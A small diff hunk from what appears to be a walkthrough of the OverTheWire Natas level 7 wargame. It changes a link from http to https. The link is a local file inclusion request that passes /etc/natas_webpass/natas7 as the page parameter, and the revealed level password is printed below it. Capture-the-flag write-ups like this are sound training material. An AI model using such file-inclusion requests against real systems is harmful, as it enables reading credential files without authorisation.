@@ -65,7 +65,7 @@ Here we are finally in front of a real vulnerability:
 We know that the password is in the file "/etc/natas_webpass/natas7", we can
 get it like this:
 
-<http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas7>
+<https://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas7>
 
 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 
 
